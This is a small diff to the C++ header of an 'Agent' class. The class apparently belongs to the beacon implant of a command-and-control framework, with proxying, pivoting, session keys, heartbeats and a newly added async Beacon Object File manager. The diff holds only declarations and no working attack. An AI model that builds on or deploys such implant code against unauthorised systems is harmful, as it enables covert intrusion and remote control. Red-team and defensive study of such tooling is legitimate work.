@@ -8,8 +8,10 @@
 #include "Proxyfire.h"
 #include "Pivotter.h"
 #include "Commander.h"
+#include "Boffer.h"
 
 class Commander;
+class Boffer;
 
 class Agent
 {
@@ -22,14 +24,15 @@ public:
 	MemorySaver*    memorysaver = NULL;
 	Proxyfire*		proxyfire	= NULL;
 	Pivotter*       pivotter    = NULL;
+	Boffer*         asyncBofMgr = NULL;
 
 	Map<CHAR*, LPVOID> Values;
 
 	BYTE* SessionKey = NULL;
+	BOOL  Active     = TRUE;
 
 	Agent();
 
-	void  SetActive(BOOL state);
 	BOOL  IsActive();
 	ULONG GetWorkingSleep();
 	BYTE* BuildBeat(ULONG* size);
